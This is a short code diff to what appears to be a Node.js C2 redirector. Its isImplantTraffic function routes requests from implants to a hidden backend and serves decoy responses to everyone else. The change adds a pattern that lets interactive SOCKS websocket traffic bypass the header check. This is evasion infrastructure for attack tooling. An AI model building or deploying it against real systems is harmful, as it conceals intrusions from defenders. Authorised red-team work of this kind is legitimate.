@@ -20,6 +20,7 @@ const { URL } = require('url');
 const PORT           = process.env.PORT || 8080;
 const BACKEND_URL    = process.env.BACKEND_URL;
 const URI_PATTERN    = process.env.URI_PATTERN || '^/api/v[0-9]+/';
+const INTERACTIVE_URI_PATTERN = process.env.INTERACTIVE_URI_PATTERN || '^/api/socks/[^/]+/ws$';
 const HEADER_NAME    = (process.env.HEADER_NAME || 'X-Request-ID').toLowerCase();
 const HEADER_PATTERN = process.env.HEADER_PATTERN || '^[a-f0-9]{32}$';
 const DECOY_BODY     = process.env.DECOY_RESPONSE ||
@@ -37,6 +38,7 @@ const backendClient = backendIsHttps ? https : http;
 const backendPort = backend.port || (backendIsHttps ? 443 : 80);
 
 const uriRegex = new RegExp(URI_PATTERN);
+const interactiveUriRegex = new RegExp(INTERACTIVE_URI_PATTERN);
 const hdrRegex = new RegExp(HEADER_PATTERN);
 
 // -- Headers to strip -------------------------------------------------------
@@ -59,7 +61,9 @@ const STRIP_RESPONSE_HEADERS = new Set([
 
 function isImplantTraffic(req) {
   const url = req.url || '/';
-  if (!uriRegex.test(url)) return false;
+  const pathname = url.split('?')[0];
+  if (interactiveUriRegex.test(pathname)) return true;
+  if (!uriRegex.test(pathname)) return false;
 
   // Header check is optional — if HEADER_NAME is empty or 'none', skip it.
   // This allows the redirector to work with implants that don't send profile
